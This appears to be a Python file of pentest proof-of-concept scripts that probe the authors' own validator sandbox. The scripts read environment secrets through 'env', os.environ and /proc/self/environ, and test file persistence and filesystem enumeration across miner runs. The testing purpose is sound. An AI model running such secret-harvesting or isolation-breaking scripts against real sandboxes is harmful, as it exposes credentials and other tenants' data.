# Malicious Miner Scripts Proof of Concept
#
# These scripts are designed to be placed in miner_axon.py's SECRET_SCRIPT
# to pentest the validator_chute.py sandbox.


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 1: Frame Escape (Data Leakage via Return)
# STATUS: PATCHED — _audit_script blocks __traceback__, f_back, f_globals, etc.
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 2: Unpatching Network + Active Exfiltration
# STATUS: PATCHED — Requires the frame escape patched above.
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 3: Subprocess Environment Leakage
#
# Tests whether secrets are visible via:
#   - subprocess.check_output("env") 
#   - os.environ dict
#   - /proc/self/environ (kernel snapshot)
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_3 = r"""
def score(data: dict) -> dict:
    import subprocess
    import os
    
    results = {}
    
    # 1. Subprocess env
    try:
        env_output = subprocess.check_output("env", shell=True).decode()
        results["subprocess_env_has_password"] = "VALIDATOR_EXEC_PASSWORD" in env_output
        results["subprocess_env_has_s3_secret"] = "S3_SECRET_KEY" in env_output
    except Exception as e:
        results["subprocess_env_error"] = str(e)
        
    # 2. Python os.environ
    results["python_env_has_password"] = "VALIDATOR_EXEC_PASSWORD" in os.environ
    results["python_env_has_s3_secret"] = "S3_SECRET_KEY" in os.environ
        
    # 3. /proc/self/environ (binary read — handles null bytes properly)
    try:
        with open("/proc/self/environ", "rb") as f:
            raw = f.read()
        proc_env = raw.replace(b"\x00", b"\n").decode(errors="replace")
        results["proc_environ_has_password"] = "VALIDATOR_EXEC_PASSWORD" in proc_env
        results["proc_environ_has_s3_secret"] = "S3_SECRET_KEY" in proc_env
        # Show a snippet of /proc/self/environ for forensic analysis
        results["proc_environ_snippet"] = proc_env[:500]
    except PermissionError:
        results["proc_environ"] = "BLOCKED (PermissionError) ✓"
    except Exception as e:
        results["proc_environ_error"] = str(e)
    
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 4: Cross-Miner File Leakage 
#
# First invocation: writes a file to /tmp and to the workspace.
# Second invocation: tries to read files left by the first invocation.
#
# Run this TWICE in sequence. The second run should see nothing.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_4_WRITE = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    # Write a "secret" to the workspace (should be inside tempdir)
    with open("miner_secret.txt", "w") as f:
        f.write("THIS IS MINER A's SECRET MODEL WEIGHTS")
    
    # Also try to write outside the workspace to /tmp directly
    try:
        with open("/tmp/persistent_secret.txt", "w") as f:
            f.write("MINER A ESCAPED THE SANDBOX")
        results_tmp = "wrote to /tmp/persistent_secret.txt"
    except Exception as e:
        results_tmp = f"blocked: {e}"
    
    cwd = os.getcwd()
    ls_output = subprocess.check_output("ls -la", shell=True).decode()
    
    return {
        "action": "WRITE",
        "cwd": cwd,
        "workspace_files": ls_output,
        "tmp_write_attempt": results_tmp,
    }
"""

EXPLOIT_4_READ = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Check if we can see the previous miner's files in the workspace
    cwd = os.getcwd()
    ls_output = subprocess.check_output("ls -la", shell=True).decode()
    results["cwd"] = cwd
    results["workspace_files"] = ls_output
    
    # Check /tmp for leftover files
    tmp_output = subprocess.check_output("ls -la /tmp", shell=True).decode()
    results["tmp_files"] = tmp_output
    
    # Try to read the file the previous miner left in /tmp
    try:
        with open("/tmp/persistent_secret.txt", "r") as f:
            results["stolen_secret"] = f.read()
    except FileNotFoundError:
        results["stolen_secret"] = "NOT FOUND (workspace cleaned correctly) ✓"
    except Exception as e:
        results["stolen_secret"] = f"error: {e}"
    
    return results
"""


# ─────────────────────────────────────────────────────────────────────────────
# EXPLOIT 5: Reading chute source code
#
# Tries to read the validator_chute.py source code from disk.
# This is EXPECTED to succeed since the source is public.
# What we want to verify: no secrets are hardcoded in the source.
# ─────────────────────────────────────────────────────────────────────────────

EXPLOIT_5 = r"""
def score(data: dict) -> dict:
    import os
    import subprocess
    
    results = {}
    
    # Find Python files on disk
    try:
        find_output = subprocess.check_output(
            "find / -name '*.py' -path '*/validator*' 2>/dev/null | head -20",
            shell=True
        ).decode()
        results["validator_files"] = find_output
    except Exception as e:
        results["find_error"] = str(e)
    
    # Try to read /app contents (typical chutes deploy path)
    try:
        app_files = subprocess.check_output("ls -la /app/ 2>/dev/null || echo 'no /app'", shell=True).decode()
        results["app_directory"] = app_files
    except Exception as e:
        results["app_dir_error"] = str(e)
        
    return results
"""
